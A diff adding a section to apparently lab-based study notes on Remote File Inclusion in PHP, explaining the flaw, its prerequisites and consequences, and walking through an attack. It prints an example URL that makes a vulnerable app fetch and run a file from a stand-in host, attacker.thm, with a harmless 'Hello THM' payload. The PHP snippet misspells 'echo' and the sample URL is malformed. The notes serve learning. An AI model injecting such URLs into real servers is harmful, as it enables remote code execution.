@@ -431,6 +431,29 @@ This work because the PHP filter matches and replaces the first subset string ``
 
 ![image](https://user-images.githubusercontent.com/79100627/166819691-82031b30-b8aa-41bb-a244-4758ff7c0920.png)
 
+## Remote File Inclusion - RFI
+
+Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into ```include``` function. One requirement for RFI is that ```allow_url_fopen``` option needs to be ```on```. 
+
+The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include: 
+
+- Sensitive Information Disclosure 
+- Cross Scripting (XSS) 
+- Denial of Service (DoS) 
+
+An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is inejcted into the include function via HTTP requests, and the content of malicious file executes on the vulnerable application server. 
+
+![image](https://user-images.githubusercontent.com/79100627/166822359-57abe026-c07d-4e80-9665-704ae7213610.png)
+
+## RFI steps 
+
+The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server ```http://attacker.thm/cmd.txt``` where ```cmd.txt``` contains a printing message ```Hello THM```. 
+
+```
+<?PHP echp "Hello THM";?>
+```
+
+First attacker injects malicious URL, which points to the attacker's server, such as ```http://webapp.thm.index.php?lang=http://attacker.thm/cmd.txt```. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the ```Hello THM``` message. 
 
 
 
